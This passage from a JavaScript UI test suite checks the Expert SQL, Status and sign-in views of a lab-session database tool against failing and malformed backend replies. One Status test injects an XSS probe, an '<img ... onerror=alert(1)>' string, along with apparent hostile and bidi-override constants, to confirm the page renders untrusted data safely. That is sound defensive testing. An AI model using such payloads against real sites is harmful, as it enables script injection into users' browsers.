  const off = await open({hash: '#signin=' + CODE, brokenStorage: true});
  assert.ok(off.shown('view-app'), 'signing in works without storage');
  await off.go('#expert');
  await off.type('arc-user', 'demo-user');
  assert.strictEqual(off.seen('arc-user-status'), 'Used until you close this page.');
});

test('Expert: when the list of tables cannot be loaded there is a way to try again', async function () {
  let down = true;
  const page = await open({token: ADMIN_TOKEN, hash: '#expert', routes: {
    'GET /api/v1/sql/schema': function () { return down ? NETWORK : {status: 200, body: SCHEMA}; },
    'GET /api/v1/sql/examples': function () { return down ? NETWORK : {status: 200, body: EXAMPLES}; }}});
  assert.ok(/^The backend is not reachable\./.test(page.seen('schema-status')));
  assert.ok(page.shown('schema-retry'));
  assert.strictEqual(page.byId('sql-examples').options[0].textContent, 'Examples unavailable');
  down = false;
  await page.click(page.byId('schema-retry'));
  assert.strictEqual(page.seen('schema-status'), '');
  assert.ok(!page.shown('schema-retry'));
  assert.ok(page.seen('schema-list').indexOf('sessions') !== -1);
  assert.strictEqual(page.byId('sql-examples').options.length, 2);
  audit(page);

  const empty = await open({token: ADMIN_TOKEN, hash: '#expert', routes: {
    'GET /api/v1/sql/schema': {status: 200, body: {engine: 'sqlite', schema: 'pcl', objects: []}},
    'GET /api/v1/sql/examples': {status: 200, body: {engine: 'sqlite', examples: []}}}});
  assert.strictEqual(empty.seen('schema-status'), 'The backend listed no tables.');
  assert.strictEqual(empty.byId('sql-examples').options[0].textContent, 'No examples');
  assert.strictEqual(empty.seen('history-status'), 'No queries yet.');
  audit(empty);
});

// ---- Status ---------------------------------------------------------------------------------------

test('Status: the database, the search and the assistant in plain words', async function () {
  const page = await open({token: ADMIN_TOKEN, hash: '#status'});
  const text = page.seen('panel-status');
  ['The session records are kept in PostgreSQL 18.7 (this computer, port 15439).', 'These are made-up demo sessions, not lab data.',
    'Sessions 16', 'Files 420', 'Analysis runs 14', 'Classified points 156', 'raman-portable 12',
    "Questions in Normal mode are searched in this computer's copy of the index. Globus Search is not in use yet.",
    'Globus index not set up yet', 'Globus sign-in not signed in', 'Waiting to be sent to Globus Search 16',
    'The ARC assistant can be reached. It reads each question and writes the short answer above the table.',
    'The assistant works with the personal ARC key of whoever runs pcldb on this computer. A shared server needs an answer from ARC about keys first.',
    'Right now can be reached', 'Model gpt-oss-120b', 'The last check said: The ARC LLM service answers and accepts the key.',
    'About the two modes', 'You are admin: Normal and Expert', 'Newest registrations',
    'registered demo data admin', 'refused an upload'].forEach(function (needle) {
    assert.ok(text.indexOf(needle) !== -1, 'missing: ' + needle + '\n' + text);
  });
  // Three compact cards: a title, a coloured dot with the state, one plain line, a few facts, and
  // everything else behind a closed "Details".
  const cards = page.byId('status-cards').childNodes;
  assert.deepStrictEqual(cards.map(function (card) { return seen(card.querySelectorAll('h3')[0]); }), ['Database', 'Search index', 'Assistant']);
  assert.deepStrictEqual(cards.map(function (card) {
    return card.querySelectorAll('span').filter(function (span) { return span.classList.contains('pill'); }).map(function (span) {
      return span.className + ' ' + seen(span);
    }).join();
  }), ['pill pill-ok Running', 'pill pill-ok Local index', 'pill pill-ok Ready']);
  // A healthy database is not marked as needing attention: "demo data" is a word in its line.
  assert.deepStrictEqual(cards.map(function (card) { return seen(card.querySelectorAll('p')[0]); }),
    ['PostgreSQL 18.7 \u{b7} demo data', "Questions search this computer's copy of the index.", 'Reads questions and writes short answers.']);
  cards.forEach(function (card) {
    const details = card.querySelectorAll('details');
    assert.strictEqual(details.length, 1);
    assert.strictEqual(details[0].open, false);
    assert.ok(seen(details[0]).length > seen(card).length / 3, 'the long words are in Details');
  });
  assert.ok(seen(cards[0].querySelectorAll('details')[0]).indexOf('The session records are kept in') !== -1);
  assert.ok(seen(cards[2].querySelectorAll('details')[0]).indexOf('A shared server needs an answer from ARC') !== -1);
  await page.click(page.byId('status-refresh'));
  assert.strictEqual(page.paths('GET /api/v1/status').length, 2);
  audit(page);
});

test('Status: each state of the assistant, Globus Search in use, an empty database, a reply with holes', async function () {
  const states = {
    off_vpn: /cannot be reached now: this computer is not on the VT campus network or VPN\. Connect to the VT VPN/,
    bad_key: /refused the key saved on this computer\. Make a new key at llm\.arc\.vt\.edu/,
    error: /did not answer the last check/,
    unknown: /has not been checked yet/,
    surprise: /has not been checked yet/
  };
  for (const state of Object.keys(states)) {
    const page = await open({token: ADMIN_TOKEN, hash: '#status', routes: {'GET /api/v1/status': {status: 200, body: statusReply({assistant: {state: state, note: ''}})}}});
    assert.ok(states[state].test(page.seen('status-cards')), state + ': ' + page.seen('status-cards'));
    assert.ok(page.seen('status-cards').indexOf('The last check said') === -1, 'an empty note is not shown');
    audit(page);
  }
  // K-05: with no key saved, the note says what the sentence says already: it is not repeated.
  const noKey = await open({token: ADMIN_TOKEN, hash: '#status', routes: {'GET /api/v1/status': {status: 200, body: statusReply({
    assistant: {enabled: true, key_present: false, state: 'no_key', note: 'No ARC LLM key is saved on this computer.'}})}}});
  assert.ok(noKey.seen('status-cards').indexOf('The last check said') === -1, 'the no-key note is said once');
  assert.ok(noKey.seen('status-cards').indexOf('No ARC LLM key is saved on this computer.') === -1, 'the no-key note is said once');
  audit(noKey);
  const off = await open({token: ADMIN_TOKEN, hash: '#status', routes: {'GET /api/v1/status': {status: 200, body: statusReply({
    assistant: {enabled: false, state: 'ready'}, search: {backend: 'globus', index_set: true, signed_in: true, entries: {synced: 14, failed: 2, held: 1}},
    database: {engine: 'sqlite', version: '3.45.3', where: 'this computer, two files', sessions: 0, files: 0, runs: 0, points: 0, demo: false,
      instruments: [], newest_started_utc: null}, registrations: {}})}}});
  let text = off.seen('panel-status');
  ['The assistant is switched off in the settings. Keyword rules read the questions, and no written answer is given.', 'Right now switched off',
    'Questions in Normal mode are searched with Globus Search, a hosted index that holds one small entry for each session.',
    'Globus index set up', 'In Globus Search 14', 'Could not be sent 2', 'held 1', 'The session records are kept in SQLite 3.45.3',
    'Sessions 0', 'Newest session no start time', 'Some not sent 2 entries could not be sent.', 'Running SQLite 3.45.3'].forEach(function (needle) {
    assert.ok(text.indexOf(needle) !== -1, 'missing: ' + needle + '\n' + text);
  });
  assert.ok(text.indexOf('made-up demo sessions') === -1 && !off.shown('demo-chip'));
  audit(off);

  for (const body of [{}, {database: null, search: null, assistant: null, registrations: null}, {database: 'x', search: 5, assistant: [], registrations: 'none'},
    {registrations: [null, 5, {}, {session_path: {a: 1}, action: EVIL, source: EVIL + RLO, user_name: LONG, at_utc: EVIL}],
      database: {where: EVIL + RLO + LONG, instruments: [null, {instrument: EVIL + RLO, sessions: 'many'}]}, assistant: {note: EVIL + RLO + LONG, model: LONG, enabled: true, key_present: true, state: EVIL},
      search: {entries: {'<img src=x onerror=alert(1)>': 3, pending: 'lots'}}}]) {
    const odd = await open({token: ADMIN_TOKEN, hash: '#status', routes: {'GET /api/v1/status': {status: 200, body: body}}});
    text = odd.seen('panel-status');
    assert.ok(text.indexOf('Database') !== -1 && text.indexOf('Search index') !== -1 && text.indexOf('Assistant') !== -1, JSON.stringify(body).slice(0, 60));
    assert.ok(text.length < 9000, text.length + ' characters on the Status view');
    audit(odd);
  }
  const none = await open({token: ADMIN_TOKEN, hash: '#status', routes: {'GET /api/v1/status': {status: 200, body: statusReply({registrations: {}})}}});
  assert.ok(none.seen('status-registrations') === 'Nothing has been registered yet.');
  const down = await open({token: ADMIN_TOKEN, hash: '#status', routes: {'GET /api/v1/status': NETWORK}});
  assert.ok(/^The backend is not reachable\./.test(down.seen('status-line')));
  audit(down);
});

// ---- the first request and the header -------------------------------------------------------------

test('when /me fails the page says why and offers to try again; odd replies do not break the header', async function () {
  let down = true;
  const page = await open({token: ADMIN_TOKEN, routes: {'GET /api/v1/me': function () { return down ? NETWORK : {status: 200, body: meReply('admin')}; }}});
  assert.ok(page.shown('view-loading') && page.shown('boot-retry'));
  assert.ok(/^The backend is not reachable\./.test(page.seen('boot-status')));
  assert.strictEqual(page.window.sessionStorage.data['pcldb.token'], ADMIN_TOKEN, 'a backend that is down does not sign the person out');
  down = false;
  await page.click(page.byId('boot-retry'));
  assert.ok(page.shown('view-app'));
  audit(page);

  const stalled = await open({token: ADMIN_TOKEN, routes: {'GET /api/v1/me': HANG}});
  assert.strictEqual(stalled.seen('boot-status'), 'Signing in...');
  await stalled.wait(30000);
  assert.ok(/^The backend did not answer in time\./.test(stalled.seen('boot-status')) && stalled.shown('boot-retry'));
  audit(stalled);

  for (const body of [{}, {user: null, capabilities: null, engine: null, defaults: null, storage: null, version: null},
    {user: {name: EVIL + RLO, display_name: LONG, role: EVIL + RLO + LONG}, capabilities: 'sql', engine: {name: EVIL, version: LONG},
      defaults: {include_simulated: 'no', sql_max_rows: 'many'}, storage: 'x', version: LONG}]) {
    const odd = await open({token: ADMIN_TOKEN, routes: {'GET /api/v1/me': {status: 200, body: body}}});
    assert.ok(odd.shown('view-app') && odd.shown('panel-normal') && !odd.shown('tab-expert'), 'no "sql" in a list: no Expert');
    assert.ok(odd.seen('who').length < 150, 'the header stays small: ' + odd.seen('who').length);
    assert.strictEqual(odd.byId('ask-simulated').checked, true);
    assert.strictEqual(odd.seen('sql-limit'), 'Read-only.');
    audit(odd);
  }
});

// ---- run --------------------------------------------------------------------------------------------

// tests/web_replay_test.js uses the same stand-in browser with replies of the real backend.
module.exports = {open: open, audit: audit, seen: seen, shown: shown, everyElement: everyElement,
  Element: Element, Text: Text};

if (require.main === module) (async function () {
  let failures = 0;
  for (const item of tests) {
    try {
      await item.body();
      console.log('ok      ' + item.name);
    } catch (err) {
      failures += 1;
      console.log('FAILED  ' + item.name);
      console.log(String(err && err.stack ? err.stack : err).split('\n').slice(0, 14).map(function (line) {
        return '        ' + line;
      }).join('\n'));
    }
  }
  console.log(tests.length - failures + ' of ' + tests.length + ' passed');
  process.exit(failures === 0 ? 0 : 1);
})();
